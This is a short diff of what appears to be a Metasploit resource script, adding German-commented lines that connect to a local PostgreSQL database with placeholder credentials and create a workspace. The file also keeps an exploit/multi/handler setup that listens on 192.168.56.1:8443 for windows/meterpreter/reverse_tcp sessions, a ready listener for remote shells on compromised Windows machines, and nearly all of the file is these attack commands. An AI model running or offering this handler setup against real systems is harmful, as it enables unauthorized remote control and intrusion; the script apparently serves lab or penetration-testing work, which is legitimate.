@@ -1,5 +1,10 @@
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.56.1
-set LPORT 8443
-exploit
+# mysql oder postgres
+  db_driver postgresql
+  db_connect benutzername:passwort@127.0.0.1:5432/datenbankname
+  db_workspace -a MyProject
+# reconnect
+  use exploit/multi/handler
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  set LHOST 192.168.56.1
+  set LPORT 8443
+  exploit
